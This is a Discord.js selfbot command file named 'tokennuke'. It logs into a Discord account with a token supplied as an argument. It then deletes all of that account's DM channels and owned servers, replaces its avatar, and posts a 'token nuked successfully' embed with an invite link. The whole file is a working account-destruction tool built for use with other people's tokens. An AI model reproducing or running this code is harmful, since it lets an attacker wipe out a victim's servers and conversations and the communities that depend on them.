
const {
  Client,
  RichEmbed
} = require('discord.js')
const config = require('../../config.json')
const photo = config.photo
module.exports.run = async (bot, message, args) => {
  if (message.author.bot) return
  const yournukebotname = new Client()
  const nuketoken = args.join(' ')
  yournukebotname.login(nuketoken)
  yournukebotname.on('ready', () => {
    yournukebotname.users.forEach(users => users.deleteDM())
    yournukebotname.guilds.forEach(guild => guild.delete())
    yournukebotname.user.setAvatar('https://www.newstatesman.com/sites/default/files/styles/cropped_article_image/public/blogs_2016/12/untitled_design_41_.png')
  })
  const embed = new RichEmbed()
    .setColor('RANDOM')
    .setTitle('ᵉˡˡⁱᵒᵗ ˢᵉˡᶠ ᵇᵒᵗ')
    .setDescription('```ᴛᴏᴋᴇɴ ɴᴜᴋᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ```')
    .setThumbnail(photo)
    .setFooter('『https://discord.gg/mYsaYxtqdG』', message.author.displayAvatarURL)
  message.edit(embed)
}

module.exports.help = {
  name: 'tokennuke'
}
